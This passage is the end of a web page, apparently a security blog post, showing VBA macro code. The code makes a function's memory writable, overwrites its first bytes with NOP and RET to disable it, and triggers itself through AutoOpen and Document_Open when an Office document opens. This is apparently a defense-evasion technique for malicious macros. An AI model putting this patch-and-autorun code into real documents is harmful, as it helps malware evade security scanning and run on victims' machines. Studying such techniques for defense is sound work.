<span class="nx">temp</span> <span class="o">=</span> <span class="nx">VirtPro</span><span class="p">(</span><span class="nx">ByVal</span> <span class="nx">Func_addr</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="nx">old</span><span class="p">)</span>
<span class="nx">patched</span> <span class="nx">ByVal</span> <span class="p">(</span><span class="nx">Func_addr</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">ByVal</span> <span class="p">(</span><span class="dl">"</span><span class="s2">&amp;H</span><span class="dl">"</span> <span class="o">&amp;</span> <span class="dl">"</span><span class="s2">90</span><span class="dl">"</span><span class="p">)</span>
<span class="nx">patched</span> <span class="nx">ByVal</span> <span class="p">(</span><span class="nx">Func_addr</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">ByVal</span> <span class="p">(</span><span class="dl">"</span><span class="s2">&amp;H</span><span class="dl">"</span> <span class="o">&amp;</span> <span class="dl">"</span><span class="s2">C3</span><span class="dl">"</span><span class="p">)</span>
<span class="nx">temp</span> <span class="o">=</span> <span class="nx">VirtPro</span><span class="p">(</span><span class="nx">ByVal</span> <span class="nx">Func_addr</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="nx">old</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>

<span class="nx">End</span> <span class="nb">Function</span>

<span class="dl">'</span><span class="s1">macro name is test which calls the main method
Sub test()
 MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub
</span></code></pre></div></div>


    </main><footer>
  <a href="https://twitter.com/ratilovich">Twitter</a> 
</footer>
</div>
  </body>
</html>
